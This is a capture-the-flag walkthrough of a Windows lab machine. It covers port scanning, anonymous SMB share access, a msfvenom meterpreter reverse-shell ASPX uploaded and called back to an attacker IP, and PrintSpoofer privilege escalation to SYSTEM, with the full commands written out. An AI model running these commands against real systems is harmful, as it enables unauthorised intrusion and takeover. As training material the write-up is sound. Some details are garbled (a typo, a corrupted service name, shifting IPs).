we start by enumerating the ports with a classical nmap:

	namp -p- 10.10.188.86

output:

	80/tcp    open  http          Microsoft IIS httpd 10.0
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: IIS Windows Server
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  ЅwKwU        Windows Server 2016 Standard Evaluation 14393 microsoft-ds
	3389/tcp  open  ms-wbt-server Microsoft Terminal Services
	| ssl-cert: Subject: commonName=Relevant
	| Not valid before: 2023-09-14T13:26:58
	|_Not valid after:  2024-03-15T13:26:58
	|_ssl-date: 2023-09-15T14:03:21+00:00; +3s from scanner time.
	| rdp-ntlm-info: 
	|   Target_Name: RELEVANT
	|   NetBIOS_Domain_Name: RELEVANT
	|   NetBIOS_Computer_Name: RELEVANT
	|   DNS_Domain_Name: Relevant
	|   DNS_Computer_Name: Relevant
	|   Product_Version: 10.0.14393
	|_  System_Time: 2023-09-15T14:02:42+00:00
	49663/tcp open  http          Microsoft IIS httpd 10.0
	|_http-server-header: Microsoft-IIS/10.0
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-title: IIS Windows Server
	49667/tcp open  msrpc         Microsoft Windows RPC
	49669/tcp open  msrpc         Microsoft Windows RPC

There is an SMB open, we can enumerate it with the following command:

	smbclient -L \\\\10.10.188.86\\

output: 

	nt4wrksv /it's the only share available/

we can try to connect it with:

	smbclient \\\\10.10.188.86\\nt4wrksv 

output:

	passwords.txt

we get it and we read inside the .txt:

	get passwords.txt

inside there is a base64 credential, we need to decode it in UTF-8:

	Bill /Redacted/

after many tries there isn't any possible way to use these credentials, so I take some steps back and I try to enumerate the directories on the webserver running in the ports _80_ and _49663_ with the comand below:

	feroxbuster -u http://10.10.89.68:49663/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

there isn't anything but I notice that I can upload files on smb, my idea it was to upload a _reverse.aspx_ and view it in the browser, let's to create the revshell:

	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.98.143 LPORT=4444 -f aspx -o reverse.aspx

we create the revshell now we upload it and we start the listener:

	smbclient \\\\10.10.188.86\\nt4wrksv 
	put ./reverse.aspx

	msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.8.98.143; set lport 4444; exploit"

now it's time to browse this url __http://10.10.173.140:49663/nt4wrksv/reverse.aspx__, we achieve it and we can retrieve the user flag, now it's time to do some privesc and retrieve the root flag.

I use the following command to see my privileges:

	whoami /priv

output:

	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
	SeCreateGlobalPrivilege       Create global objects                     Enabled

the most interesting is the second one indeed after some researches there is an executable file (_PrintSpoofer64.exe_) in order to achieve the SYSTEM account

we upload it on the target machine:

	python3 -m http.server 80 #we run a python webserver

	curl -o .\printspoof.exe http://10.8.98.143/PrintSpoofer64.exe

now. we can run it:

	 PrintSpoofer64.exe -i -c cmd

we're SYSTEM and we can retrieve the root flag.